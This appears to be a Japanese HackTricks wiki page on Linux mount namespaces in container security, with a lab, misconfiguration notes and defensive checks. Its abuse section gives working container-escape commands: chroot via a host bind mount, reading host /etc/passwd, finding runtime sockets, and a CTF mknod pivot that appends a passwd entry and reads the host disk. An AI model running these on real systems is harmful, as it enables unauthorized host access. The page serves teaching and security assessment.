# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## 概要

マウント namespace は、プロセスが認識する **マウントテーブル** を制御します。これは最も重要なコンテナ分離機能の1つです。なぜなら、root filesystem、bind mount、tmpfs mount、procfs のビュー、sysfs の公開範囲、そしてランタイム固有の各種ヘルパーマウントは、すべてこのマウントテーブルを通じて表現されるからです。2つのプロセスがどちらも `/`、`/proc`、`/sys`、または `/tmp` にアクセスできる場合でも、それらのパスが何を指すかは、所属するマウント namespace によって異なります。

container security の観点では、マウント namespace は、「きちんと準備されたアプリケーション filesystem」と「このプロセスが host filesystem を直接確認または操作できる状態」の違いになることがよくあります。そのため、bind mount、`hostPath` volume、privileged な mount 操作、書き込み可能な `/proc` や `/sys` の公開は、すべてこの namespace を中心に展開されます。

## 動作

runtime がコンテナを起動すると、通常は新しいマウント namespace を作成し、コンテナ用の root filesystem を準備し、必要に応じて procfs やその他のヘルパー filesystem を mount し、その後、bind mount、tmpfs mount、secret、config map、または host path を追加します。そのプロセスが namespace 内で実行されると、プロセスから見える mount の集合は、host のデフォルトビューから大きく切り離されます。host からは実際の基盤 filesystem が引き続き見える場合がありますが、コンテナからは runtime がコンテナ用に組み立てた filesystem が見えます。

これは、host がすべてを管理しているにもかかわらず、コンテナに独自の root filesystem があると思わせられるため強力です。一方で、runtime が誤った mount を公開すると、プロセスは host resource を可視化できるようになり、他の security model がその保護を想定して設計されていなかった場合、危険な状態になります。

## Lab

次のコマンドで private mount namespace を作成できます。
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
別の shell をその namespace の外側で開いて mount table を確認すると、tmpfs mount が分離された mount namespace 内にのみ存在することがわかります。これは、mount isolation が抽象的な理論ではなく、kernel が実際にプロセスへ異なる mount table を提示していることを示す有用な演習です。
別の shell をその namespace の外側で開いて mount table を確認すると、tmpfs mount は分離された mount namespace 内にのみ存在します。

containers 内では、簡単な比較として次のようになります：
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
2つ目の例は、runtime configurationによって filesystem boundary にどれほど簡単に大きな穴を開けられるかを示しています。

## ランタイムでの利用

Docker、Podman、containerd-based stacks、CRI-Oはすべて、通常のコンテナで private mount namespace に依存しています。Kubernetesは、volumes、projected secrets、config maps、`hostPath` mountsで同じ仕組みを利用しています。Incus/LXC environmentsもmount namespacesに大きく依存しています。特にsystem containersは、application containersよりも豊富でマシンに近いfilesystemsを公開することが多いためです。

つまり、container filesystemの問題を調査するとき、通常見ているのは独立したDocker固有の問題ではありません。workloadを起動したプラットフォームを通じて表面化した、mount-namespaceとruntime-configurationの問題です。

## Misconfigurations

最も明白で危険なミスは、bind mountを通じてhost root filesystemやその他の機密性の高いhost pathを公開することです。たとえば`-v /:/host`や、Kubernetesにおける書き込み可能な`hostPath`が該当します。この時点で問題は、もはや「コンテナから何とかescapeできるか」ではなく、「有用なhost contentのうち、どれだけがすでに直接見えていて、書き込み可能か」です。書き込み可能なhost bind mountがあると、残りのexploitは、単純なfile placement、chrooting、config modification、またはruntime socket discoveryで済むことがよくあります。

もう1つの一般的な問題は、より安全なcontainer viewを回避する形で、hostの`/proc`や`/sys`を公開することです。これらのfilesystemsは通常のdata mountsではなく、kernelとprocess stateへのinterfacesです。workloadがhost versionsに直接到達できる場合、container hardeningの前提の多くが、もはやそのまま適用できなくなります。

read-only protectionsも重要です。read-only root filesystemは、コンテナを自動的にsecureにするわけではありません。しかし、attacker staging spaceを大幅に減らし、persistence、helper-binary placement、config tamperingを難しくします。逆に、writable rootやwritable host bind mountがあると、attackerは次のstepを準備するための場所を得られます。

## Abuse

mount namespaceが誤って使用されている場合、attackersは通常、次の4つのいずれかを行います。コンテナの外部に残されるべき**host dataを読み取る**。書き込み可能なbind mountsを通じて**host configurationを変更する**。capabilitiesとseccompが許可していれば、**追加のresourcesをmountまたはremountする**。または、container platform自体にさらなるaccessを要求できる、**強力なsocketsとruntime state directoriesに到達する**。

コンテナがすでにhost filesystemを参照できる場合、security modelの残りの部分は直ちに変化します。

host bind mountが疑われる場合は、まず何が利用可能で、それが書き込み可能かどうかを確認します。
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
ホストのルートファイルシステムが read-write でマウントされている場合、ホストへの直接アクセスは、多くの場合、次のように簡単です。
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
直接 chroot するのではなく、特権付きのランタイムアクセスが目的である場合は、ソケットとランタイム状態を列挙します：
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
`CAP_SYS_ADMIN` が存在する場合は、コンテナ内から新しい mount を作成できるかどうかもテストします:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### 完全な例: 2つのシェルによる `mknod` Pivot

コンテナの root ユーザーが block device を作成でき、host とコンテナが有用な形で同じ user identity を共有しており、さらに攻撃者がすでに host 上で low-privilege foothold を得ている場合、より特殊な abuse path が存在します。この状況では、コンテナから `/dev/sda` などの device node を作成でき、low-privilege の host user は、対応するコンテナプロセスの `/proc/<pid>/root/` を介して、後からそのデバイスを読み取れます。

コンテナ内:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
ホスト上で、コンテナシェルのPIDを特定した後、対応する低権限ユーザーとして：
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
重要な教訓は、CTF の文字列を正確に検索することではありません。`/proc/<pid>/root/` を介した mount namespace の露出により、cgroup の device policy によってコンテナ内部からの直接利用が阻止されていた場合でも、host user がコンテナによって作成された device nodes を再利用できる可能性があるということです。

## Checks

これらのコマンドは、現在のプロセスが実際に存在している filesystem view を確認するためのものです。目的は、host 由来の mount、書き込み可能な機密性の高い path、そして通常の application container の root filesystem よりも広範に見えるものを見つけることです。
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
ここで注目すべき点：

- Host からの bind mount、特に `/`、`/proc`、`/sys`、runtime state directories、または socket locations は、すぐに目立つはずです。
- 予期しない read-write mount は、多数の read-only helper mount よりも通常重要です。
- `mountinfo` は、パスが実際に host 由来なのか、overlay-backed なのかを確認するのに最適な場所であることが多いです。

これらのチェックにより、**この namespace でどのリソースが可視化されているか**、**どれが host 由来なのか**、**どれが writable または security-sensitive なのか**を確認できます。
{{#include ../../../../../banners/hacktricks-training.md}}
